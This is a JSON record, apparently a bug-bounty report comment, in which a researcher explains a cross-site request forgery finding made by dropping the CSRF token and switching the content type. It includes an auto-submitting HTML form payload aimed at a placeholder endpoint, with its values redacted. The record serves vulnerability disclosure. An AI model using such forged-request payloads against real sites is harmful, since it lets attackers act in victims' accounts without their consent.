    {
      "id": 569422,
      "category": "researcher",
      "content": "Hi there!\n\nI found this issue by removing the CsrfToken from the header and converting the content type from `JSON` to `x-www-form-urlencoded`. After multiple attempts, I was able to create the final payload:\n```\n<form method=\"POST\" action=\"https://vulnerableEndpoint\">\n    \n    <input type=\"hidden\" name=\"category_id\" value=\"X\"/>\n    <input type=\"hidden\" name=\"title\" value=\"Happy\"/>\n    <input type=\"hidden\" name=\"componentContents\" value='[{\"id\":\"X\",\"raw_value\":\"very happy\"},{\"id\":\"X\",\"raw_value\":\"[{\\\"status\\\":\\\"done\\\",\\\"percent\\\":XXXX,\\\"uid\\\":\\\"XXXX\\\",\\\"originFile\\\":{},\\\"name\\\":\\\"XXXX\\\",\\\"response\\\":{\\\"file_id\\\":\\\"XXXXXX\\\",\\\"file_name\\\":\\\"XXXX\\\",\\\"file_type\\\":\\\"image/png\\\",\\\"file_src\\\":X,\\\"url\\\":\\\"XXXX\\\"}}]\",\"plain_value\":\"[\\\"XXXXXX\\\"]\"}]'/>\n</form>\n    <script>\n        document.forms[0].submit();\n    </script>\n```\n\nIf you need more tips, feel free to follow me on X: [Ibrahim AH](https://x.com/HouranyIbrahim)",
      "updated_at": "2024-11-02T06:02:25.634Z",
